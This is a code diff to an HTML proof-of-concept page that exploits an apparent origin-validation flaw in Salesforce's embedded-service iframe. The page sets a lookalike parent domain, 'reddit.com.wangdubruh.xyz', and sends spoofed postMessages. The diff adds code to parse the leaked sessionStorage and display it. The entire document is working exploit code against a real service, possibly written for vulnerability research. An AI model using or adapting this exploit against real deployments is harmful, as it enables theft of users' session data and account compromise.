@@ -14,29 +14,39 @@
       height: 400px;
       border: 1px solid #0f0;
     }
+    pre {
+      background: #222;
+      color: #0f0;
+      padding: 1em;
+      overflow: auto;
+    }
   </style>
 </head>
 <body>
   <h2>[+] Salesforce v4.0 Origin Bypass PoC</h2>
-  <p>Check the console for leaked sessionStorage or errors.</p>
+  <p>Check the browser console and below for any leaked <code>sessionStorage</code> content.</p>
 
   <iframe
     id="sf-frame"
     src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
   ></iframe>
 
+  <h3>📦 sessionStorage Leak:</h3>
+  <pre id="output">Waiting for sessionStorage data...</pre>
+
   <script>
     const iframe = document.getElementById("sf-frame");
+    const output = document.getElementById("output");
 
     iframe.onload = () => {
       console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-      // Send messages after iframe is ready
+      // Send spoofed postMessages after load
       setTimeout(() => {
         const messages = [
           {
             method: "getSessionStorageData",
-            domain: "reddit.com.wangdubruh.xyz", // <-- must match your page origin
+            domain: "reddit.com.wangdubruh.xyz",
             deploymentId: "test123"
           },
           {
@@ -57,9 +67,19 @@
       }, 1000);
     };
 
-    // Listen for responses
     window.addEventListener("message", (e) => {
       console.log("[📩] Message from iframe:", e.data);
+
+      if (e.data.method === "sessionStorageData") {
+        try {
+          const session = JSON.parse(e.data.sessionStorage);
+          console.log("📦 Leaked sessionStorage from iframe:", session);
+          output.textContent = JSON.stringify(session, null, 2);
+        } catch (err) {
+          console.warn("❌ Failed to parse sessionStorage:", err);
+          output.textContent = "Error parsing sessionStorage!";
+        }
+      }
     });
   </script>
 </body>
